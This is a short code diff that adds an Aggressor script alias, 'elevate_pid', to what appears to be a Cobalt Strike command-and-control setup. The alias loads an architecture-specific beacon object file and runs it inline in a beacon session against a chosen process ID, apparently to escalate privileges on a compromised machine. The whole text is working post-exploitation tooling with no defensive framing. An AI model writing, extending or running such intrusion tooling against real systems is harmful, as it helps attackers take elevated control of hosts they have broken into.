@@ -1,0 +1,11 @@
+alias elevate_pid {
+	local('$barch $handle $data $args');
+	$barch  = barch($1);
+	$handle = openf(script_resource("elevate_pid. $+ $barch $+ .o"));
+	$data   = readb($handle, -1);
+	closef($handle);
+
+	btask($1, "Running elevate_pid. $+ $barch $+ .o against PID:  $+ $2 $+ ");
+	$args = bof_pack($1, "z", $2);
+	beacon_inline_execute($1, $data, "go", $args);
+}
